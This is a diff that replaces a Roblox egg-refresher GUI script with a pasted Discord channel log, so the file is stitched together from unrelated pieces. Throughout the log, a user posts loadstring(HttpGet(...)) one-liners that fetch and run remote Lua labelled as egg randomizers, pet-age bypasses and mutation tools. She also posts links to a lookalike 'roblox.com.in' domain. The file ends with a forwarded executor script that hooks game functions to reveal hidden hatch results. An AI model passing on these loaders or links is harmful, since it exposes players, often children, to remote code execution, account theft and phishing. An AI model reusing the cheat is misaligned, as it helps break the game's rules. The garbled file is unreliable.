@@ -1,187 +1,198 @@
--- Roblox Egg Refresher Script - Full Version
+lily
+liembotchi
+Online
 
+This is the start of the #lilys-things channel. 
+lily — 25/06/2025 22:05
+https://raw.githubusercontent.com/pastabein/Get_Script_Link/refs/heads/main/Scripts
+lily — 30/06/2025 21:41
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pastabein/No-Lag-HUB/refs/heads/main/LoaderV1.lua"))()
+lily — 05/07/2025 20:02
+https://raw.githubusercontent.com/ReiX31/REI-SPAWNER/refs/heads/main/SCRIPT1
+lily — 07/07/2025 14:07
+https//www.roblox.com/users/9870406/profile
+Roblox
+verseqts's Profile
+verseqts is one of the millions creating and exploring the endless possibilities of Roblox. Join verseqts on Roblox and explore together! A chill player on Roblox
+Image
+https://www.roblox.com.in/users/8224576181/profile
+Roblox
+vurqts's Profile
+vurqts is one of the millions creating and exploring the endless possibilities of Roblox. Join vurqts on Roblox and explore together!Designer ★ owner of artificial. 100K sales.
+Image
+https://www.roblox.com.in/games/126884695634066/Grow-a-Garden?privateServerLinkCode=59894902018154026187826612351994
+Roblox
+[🦖] Grow a Garden 🌶️
+🍅Welcome to Grow a Garden🍅
+
+Are you ready to grow your very own garden? Buy seeds from the shop when they restock, plant them, wait for them to grow, and collect the profits! Flex fruits and finds on friends, and have fun!
+
+[How To Plant]
+• Equip your seed you want to plant!
+• Click in your farm on the brown plots to plant!
+• Wait to...
+[🦖] Grow a Garden 🌶️
+lily — 07/07/2025 14:22
+https//www.roblox.com/games/126884695634066/Grow-a-Garden?privateServerLinkCode=59894902018154026187826612351994
+Roblox
+[🦖] Grow a Garden 🌶️
+🍅Welcome to Grow a Garden🍅
+
+Are you ready to grow your very own garden? Buy seeds from the shop when they restock, plant them, wait for them to grow, and collect the profits! Flex fruits and finds on friends, and have fun!
+
+[How To Plant]
+• Equip your seed you want to plant!
+• Click in your farm on the brown plots to plant!
+• Wait to...
+[🦖] Grow a Garden 🌶️
+lily — 09/07/2025 21:52
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pastabein/Egg_Randomizer/refs/heads/main/gagscriptsV1.lua"))()
+lily — 09/07/2025 22:31
+#roblox #op #growagarden #Growagarden #jandel #Sly #bestscript
+lily — 10/07/2025 07:27
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pastabein/testscript/refs/heads/main/egg"))()
+lily — 13/07/2025 01:05
+https://raw.githubusercontent.com/pastabein/Egg_Refreshersc/refs/heads/main/ModifiedLoaderV1.lua
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pastabein/Egg_Refreshersc/refs/heads/main/ModifiedLoaderV1.lua"))()
+lily — 15/07/2025 07:44
+https://raw.githubusercontent.com/pastabein/Egg_Randomizer/refs/heads/main/gagscriptsV1.lua"))()
+lily — 15/07/2025 12:57
+https://raw.githubusercontent.com/pastabein/pet-age_bypass/refs/heads/main/Modified_loader.luaV1
+loadstring(game:HttpGet(""))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pastabein/pet-age_bypass/refs/heads/main/Modified_loader.luaV1"))()
+lily — 17/07/2025 04:27
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pastabein/Petagebypass/refs/heads/main/ModifiedscriptV1.lua"))()
+lily — Yesterday at 10:49
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pastabein/mutatetest/refs/heads/main/test"))()
+lily — Yesterday at 11:17
+https://raw.githubusercontent.com/pastabein/add_mutation-pet/refs/heads/main/Mod.loader_LuaV2 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pastabein/add_mutation-pet/refs/heads/main/Mod.loader_LuaV2"))()
+lily — Yesterday at 11:50
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pastabein/add_mutation-pet/refs/heads/main/Mod.loader_LuaV2"))()
+lily — Yesterday at 21:13
+Forwarded
+local TweenService = game:GetService("TweenService")
 local player = game.Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
+
+-- Main GUI
 local screenGui = Instance.new("ScreenGui", playerGui)
-screenGui.ResetOnSpawn = false
+Expand
+zoey.txt
+8 KB
+lily — 18:14
+Forwarded
+local replicatedStorage = game:GetService("ReplicatedStorage")
+local collectionService = game:GetService("CollectionService")
+local players = game:GetService("Players")
+local runService = game:GetService("RunService")
 
-local TweenService = game:GetService("TweenService")
+local localPlayer = players.LocalPlayer
+Expand
+egg.txt
+4 KB
 
-local selectedEgg = nil
-local detectCooldown = false
+Dark Scripts - Top 1 Scripts  •  18:09
+﻿
+local replicatedStorage = game:GetService("ReplicatedStorage")
+local collectionService = game:GetService("CollectionService")
+local players = game:GetService("Players")
+local runService = game:GetService("RunService")
 
-local petNames = {
-    ["Bug Egg"] = "Snail",
-    ["Night Egg"] = "Moon Cat",
-    ["Anti-Bee Egg"] = "Wasp",
-    ["Oasis Egg"] = "Sand Snake",
-    ["Paradise Egg"] = "Capybara"
-}
+local localPlayer = players.LocalPlayer
+local currentCamera = workspace.CurrentCamera
 
-local eggColors = {
-    ["Bug Egg"] = Color3.fromRGB(102, 204, 0),
-    ["Night Egg"] = Color3.fromRGB(51, 51, 102),
-    ["Anti-Bee Egg"] = Color3.fromRGB(204, 51, 0),
-    ["Oasis Egg"] = Color3.fromRGB(51, 153, 204),
-    ["Paradise Egg"] = Color3.fromRGB(255, 223, 0),
-}
+local hatchFunction = getupvalue(getupvalue(getconnections(replicatedStorage.GameEvents.PetEggService.OnClientEvent)[1].Function, 1), 2)
+local eggModels = getupvalue(hatchFunction, 1)
+local eggPets = getupvalue(hatchFunction, 2)
 
-local scannedEggs = {}
+local espCache = {}
+local activeEggs = {}
 
-local function makeDraggable(frame)
-    frame.Active = true
-    frame.Draggable = true
-end
-
--- Start Frame
-local startFrame = Instance.new("Frame", screenGui)
-startFrame.Size = UDim2.new(0, 220, 0, 100)
-startFrame.Position = UDim2.new(0.4, 0, 0.4, 0)
-startFrame.BackgroundColor3 = Color3.new(0, 0, 0)
-Instance.new("UICorner", startFrame)
-makeDraggable(startFrame)
-
-local startButton = Instance.new("TextButton", startFrame)
-startButton.Size = UDim2.new(0.8, 0, 0.5, 0)
-startButton.Position = UDim2.new(0.1, 0, 0.25, 0)
-startButton.Text = "Start"
-startButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
-startButton.TextColor3 = Color3.new(1, 1, 1)
-Instance.new("UICorner", startButton)
-
-local mainSquare = Instance.new("Frame", screenGui)
-mainSquare.Size = UDim2.new(0, 250, 0, 250)
-mainSquare.Position = UDim2.new(0.4, 0, 0.35, 0)
-mainSquare.BackgroundColor3 = Color3.new(0, 0, 0)
-mainSquare.Visible = false
-Instance.new("UICorner", mainSquare)
-makeDraggable(mainSquare)
-
-startButton.MouseButton1Click:Connect(function()
-    startFrame.Visible = false
-    mainSquare.Visible = true
-end)
-
--- Title
-local titleLabel = Instance.new("TextLabel", mainSquare)
-titleLabel.Size = UDim2.new(1, 0, 0.12, 0)
-titleLabel.Position = UDim2.new(0, 0, 0.88, 0)
-titleLabel.Text = "Egg Refresher - Modified by NO-lag script"
-titleLabel.BackgroundTransparency = 1
-titleLabel.TextColor3 = Color3.new(1, 1, 1)
-titleLabel.Font = Enum.Font.GothamBold
-titleLabel.TextScaled = true
-
--- Choose Egg Button
-local eggButton = Instance.new("TextButton", mainSquare)
-eggButton.Size = UDim2.new(0.8, 0, 0.15, 0)
-eggButton.Position = UDim2.new(0.1, 0, 0.05, 0)
-eggButton.Text = "Choose Egg"
-eggButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
-eggButton.TextColor3 = Color3.new(1, 1, 1)
-Instance.new("UICorner", eggButton)
-
-local eggListFrame = Instance.new("Frame", screenGui)
-eggListFrame.Size = UDim2.new(0, 150, 0, 250)
-eggListFrame.Position = UDim2.new(0.4, 260, 0.35, 0)
-eggListFrame.Visible = false
-eggListFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-Instance.new("UICorner", eggListFrame)
-
-local eggList = {"Bug Egg", "Night Egg", "Anti-Bee Egg", "Oasis Egg", "Paradise Egg"}
-
-for i, egg in ipairs(eggList) do
-    local btn = Instance.new("TextButton", eggListFrame)
-    btn.Size = UDim2.new(1, 0, 0.15, 0)
-    btn.Position = UDim2.new(0, 0, (i - 1) * 0.16, 0)
-    btn.Text = egg
-    btn.BackgroundColor3 = eggColors[egg]
-    btn.TextColor3 = Color3.new(1, 1, 1)
-    Instance.new("UICorner", btn)
-
-    btn.MouseButton1Click:Connect(function()
-        selectedEgg = egg
-        eggButton.Text = egg
-        eggListFrame.Visible = false
-    end)
-end
-
-eggButton.MouseButton1Click:Connect(function()
-    eggListFrame.Visible = not eggListFrame.Visible
-end)
-
--- Add Scanning Label
-local function addScanningLabel(eggPart, text)
-    local billboard = Instance.new("BillboardGui", eggPart)
-    billboard.Size = UDim2.new(0, 120, 0, 50)
-    billboard.Adornee = eggPart
-    billboard.AlwaysOnTop = true
-
-    local label = Instance.new("TextLabel", billboard)
-    label.Size = UDim2.new(1, 0, 1, 0)
-    label.BackgroundTransparency = 1
-    label.Text = text
-    label.TextColor3 = Color3.new(1, 1, 0)
-    label.Font = Enum.Font.GothamBold
-    label.TextScaled = true
-
-    table.insert(scannedEggs, {Part = eggPart, Billboard = billboard, PetName = petNames[selectedEgg]})
-end
-
--- Detect Button
-local detectButton = Instance.new("TextButton", mainSquare)
-detectButton.Size = UDim2.new(0.8, 0, 0.15, 0)
-detectButton.Position = UDim2.new(0.1, 0, 0.25, 0)
-detectButton.Text = "Detect Egg"
-detectButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
-detectButton.TextColor3 = Color3.new(1, 1, 1)
-Instance.new("UICorner", detectButton)
-
--- Refresh Button
-local refreshButton = Instance.new("TextButton", mainSquare)
-refreshButton.Size = UDim2.new(0.8, 0, 0.15, 0)
-refreshButton.Position = UDim2.new(0.1, 0, 0.45, 0)
-refreshButton.Text = "Refresh"
-refreshButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-refreshButton.TextColor3 = Color3.new(1, 1, 1)
-refreshButton.AutoButtonColor = false
-refreshButton.Active = false
-Instance.new("UICorner", refreshButton)
-
--- Detect Logic
-detectButton.MouseButton1Click:Connect(function()
-    if detectCooldown or not selectedEgg then return end
-    detectCooldown = true
-    refreshButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-    refreshButton.Active = false
-
-    detectButton.Text = "Scanning..."
-    for _, obj in ipairs(workspace:GetDescendants()) do
-        if (obj:IsA("Model") or obj:IsA("Part")) and string.find(obj.Name:lower(), selectedEgg:lower()) then
-            addScanningLabel(obj, "Scanning Pet")
-        end
+local function getObjectFromId(objectId)
+    for eggModel in eggModels do
+        if eggModel:GetAttribute("OBJECT_UUID") ~= objectId then continue end
+        return eggModel
     end
+end
 
-    local timeRemaining = 600
-    task.spawn(function()
-        while timeRemaining > 0 do
-            task.wait(1)
-            timeRemaining -= 1
-            detectButton.Text = string.format("Scanning (%d:%02d)", math.floor(timeRemaining / 60), timeRemaining % 60)
+local function UpdateEsp(objectId, petName)
+    local object = getObjectFromId(objectId)
+    if not object or not espCache[objectId] then return end
+
+    local eggName = object:GetAttribute("EggName")
+    espCache[objectId].Text = `{eggName} | {petName}`
+end
+
+local function AddEsp(object)
+    if object:GetAttribute("OWNER") ~= localPlayer.Name then return end
+
+    local eggName = object:GetAttribute("EggName")
+    local petName = eggPets[object:GetAttribute("OBJECT_UUID")]
+   
+    local objectId = object:GetAttribute("OBJECT_UUID")
+    if not objectId then return end
+
+    local label = Drawing.new("Text")
+    label.Text = `{eggName} | {petName or "?"}`
+    label.Size = 18
+    label.Color = Color3.new(1, 1, 1)
+    label.Outline = true
+    label.OutlineColor = Color3.new(0, 0, 0)
+    label.Center = true
+    label.Visible = false
+
+    espCache[objectId] = label
+    activeEggs[objectId] = object
+end
+
+local function RemoveEsp(object)
+    if object:GetAttribute("OWNER") ~= localPlayer.Name then return end
+
+    local objectId = object:GetAttribute("OBJECT_UUID")
+    if espCache[objectId] then
+        espCache[objectId]:Remove()
+        espCache[objectId] = nil
+    end
+   
+    activeEggs[objectId] = nil
+end
+
+local function UpdateAllEsp()
+    for objectId, object in activeEggs do
+        if not object or not object:IsDescendantOf(workspace) then
+            activeEggs[objectId] = nil
+            if espCache[objectId] then
+                espCache[objectId].Visible = false
+            end
+            continue
         end
-        detectCooldown = false
-        detectButton.Text = "Detect Egg"
-        refreshButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
-        refreshButton.Active = true
-    end)
-end)
 
--- Refresh Logic
-refreshButton.MouseButton1Click:Connect(function()
-    for _, data in ipairs(scannedEggs) do
-        local label = data.Billboard:FindFirstChildOfClass("TextLabel")
+        local label = espCache[objectId]
         if label then
-            label.Text = "Scanning Pet: " .. data.PetName
+            local pos, onScreen = currentCamera:WorldToViewportPoint(object:GetPivot().Position)
+            if onScreen then
+                label.Position = Vector2.new(pos.X, pos.Y)
+                label.Visible = true
+            else
+                label.Visible = false
+            end
         end
     end
-end)
+end
+
+for _, object in collectionService:GetTagged("PetEggServer") do
+    task.spawn(AddEsp, object)
+end
+
+collectionService:GetInstanceAddedSignal("PetEggServer"):Connect(AddEsp)
+collectionService:GetInstanceRemovedSignal("PetEggServer"):Connect(RemoveEsp)
+
+local old; old = hookfunction(getconnections(replicatedStorage.GameEvents.EggReadyToHatch_RE.OnClientEvent)[1].Function, newcclosure(function(objectId, petName)
+    UpdateEsp(objectId, petName)
+    return old(objectId, petName)
+end))
+
+runService.PreRender:Connect(UpdateAllEsp)
+egg.txt
+4 KB
